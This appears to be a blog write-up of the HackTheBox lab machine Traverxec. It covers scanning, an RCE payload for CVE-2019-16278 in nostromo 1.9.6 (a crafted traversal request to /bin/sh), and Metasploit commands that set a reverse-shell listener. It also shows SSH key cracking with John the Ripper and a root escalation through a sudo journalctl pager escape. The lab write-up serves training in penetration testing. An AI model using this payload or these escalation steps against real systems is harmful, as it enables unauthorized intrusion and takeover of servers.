---
title: Write-up Traverxec Machine
author: pcw3r
date: 2020-04-11 11:33:00 +0800
categories: [HackTheBox, Pentest]
tags: [LINUX, EASY, ENUMERATION, WEB EXPLOITATION, PASSWORD CRACKING, GTFOBINS-ABUSE, SHELL-ESCAPING, CVE]
math: true
---

**<center>RefÂ°: HTB-03-Pentest</center>**

![Desktop View]({{ "/assets/img/traverxec/HTB-Badge-Traverxec.png" | relative_url }})

--- Traverxec is a Linux machine that highlights the exploitation of CVE through nostromo version 1.9.6 to gain first level access. Then allow the enumeration to escalate our privileges through a found and cracked backup ssh key. That to get Flag user.

After that we find a script named "server-stats.sh" which allow to user David run especially command under root permission. To increase our privilege and gain root permission we use GTFOBin on journalctl and the execution of linux pager tool to allow the navigation in script result under root permission. That to get Flag root.

![Desktop View]({{ "/assets/img/traverxec/HTB-Information-Traverxec.png" | relative_url }})

## **<span style='color:#c0392b'>Discovery - Figure out environment</span>**
### Check all services
***
The nmap scan reveals `SSH` and `Apache` to be running on their usual ports.

```terminal
$ nmap -A -T5 10.10.10.165 -p-
```

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-nmap.png" | relative_url }})

### Web
***
Nostromo run on the web service in version `1.9.6`.

### Vulnerabilities
***

Here our target is Nostromo software. We check all vulnerabilities with metasploit and we find 2 vulnerabilities presents in our version.

We are two CVE : 2019-16278 and 2019-16279. The first one is more interesting, it allow an RCE through directory transversal.

### Reviewing Code
***
Reference - exploit : <https://www.exploit-db.com/exploits/47837>

This issue is caused by a directory traversal in the function http_verify in nostromo nhttpd allowing an attacker to achieve remote code execution via a crafted HTTP request.

```
...
def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)
...
```

The execution of the RCE dont need to be authenticated or have an authenticated user.

Metasploit module exists.

## **<span style='color:#c0392b'>Foothold - Get into the target </span>**
### Obtaining Reverse Shell from CVE Exploitation
***
```terminal
$ msfconsole
msf5 > search nostromo
msf5 > use exploit/multi/http/nostromo_code_exec
msf5 > show options
msf5 > set lhost 10.10.15.122
msf5 > set rhost 10.10.10.165
msf5 > check
msf5 > exploit
```

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-rce.png" | relative_url }})

The exploitation is successful and we have gained a foothold.

Let's appear a pseudo-terminal with this command :

Reference - pseudo-terminal : <https://hacktion.be/reverse-shell-exercice/>

```terminal
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-terminalonrce.png" | relative_url }})


## **<span style='color:#c0392b'>Lateral Movement - Move through environment</span>**
### Cracking Password
***
Enum with www-data account and check the file /etc/passwd to find all system users : `David`

We find in nostromo folder a configuration file with reference of `public_www` folder below `/var/nostromo/conf/nhttpd.conf`

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-publicfolder.png" | relative_url }})

We find `SSH Key` archive below `/home/david/public_www/protected-file-area`

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-backupssh.png" | relative_url }})

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-backupssh2.png" | relative_url }})

We retrieve the private key to exploit it with JohnTheRipper on our attacking machine.

Reference - johntheripper tool : <https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c>

```terminal
$ ./ssh2john.py ~/.ssh/David > David.hash
$ /usr/sbin/john --wordlist=/root/Documents/wordlist/rockyou.txt David.hash
```

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-jtr.png" | relative_url }})

We crack the password of the user David : `hunter`


## **<span style='color:#c0392b'>Privilege Escalation - Gain higher-level permissions</span>**
### GTFOBins abuse & Shell Escaping
***
We find bash script `server-stats.sh` below `/home/david/bin`

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-scriptexec.png" | relative_url }})

David can execute this command under root privilege without password :

```
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | usr/bin/cat
```

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-script.png" | relative_url }})

Here we want stop the script under root privilege. To do this we use 2 techniques ; `GTFOBin Abuse` on journalctl and `Shell Escaping`.

We copy the script to exploit the command line like we want.

We delete the command `/usr/bin/cat` to avoid the result of the command.

```terminal
david@traverxec:~$ cp server-stats.sh private.sh
david@traverxec:~$ chmod +x private.sh
david@traverxec:~$ nano private.sh -> delete command /usr/bin/cat
```

Before launch our script, we need to resize our terminal to allow the execution of the pager linux tool.

Reference - Shell Escaping : <https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/>

"Linux pagers are simple utilities that allow us to see the output of a particular command or text file, that is too big to fit the screen, in a paged way. The most well known are more and less."

In this situation, the result of script that appears is larger than our terminal and allow the navigation of the document under root permission.

We have the possibility to abusing of GTFOBin journalctl to appear a shell under root privilege with !/bin/sh

Reference - journalctl GTFOBin : <https://gtfobins.github.io/gtfobins/journalctl/>

![Desktop View]({{ "/assets/img/traverxec/HTB-Images-Traverxec-resizeterminal.png" | relative_url }})

***

## **<center>Trophy</center>**

> **Everything is a copy of a copy of a copy.**
>
> Chuck Palahniuk, Fight Club
